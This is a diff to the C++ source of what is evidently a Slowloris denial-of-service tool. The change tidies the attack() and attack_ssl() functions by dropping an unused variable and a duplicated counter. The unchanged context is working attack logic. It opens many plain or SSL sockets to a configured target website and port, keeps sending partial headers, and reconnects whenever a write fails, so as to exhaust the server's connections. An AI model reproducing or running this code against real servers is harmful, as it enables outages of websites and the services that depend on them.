@@ -6,7 +6,6 @@
 #include "../Headers/Slowloris.hpp"
 
 void Slowloris::attack() {
-    int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
@@ -20,7 +19,7 @@ void Slowloris::attack() {
                 init_header(&header);
             }
 
-            if((r = write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(sockets[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 init_header(&header);
@@ -29,7 +28,6 @@ void Slowloris::attack() {
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
-                conf->voly++;
             }
         }
         conf->voly++;
@@ -38,7 +36,6 @@ void Slowloris::attack() {
 }
 
 void Slowloris::attack_ssl() {
-    int r;
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
@@ -60,7 +57,7 @@ void Slowloris::attack_ssl() {
                 init_header(&header);
             }
 
-            if((r = write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
+            if((write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
@@ -71,7 +68,6 @@ void Slowloris::attack_ssl() {
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
                 }
-                conf->voly++;
             }
         }
         conf->voly++;
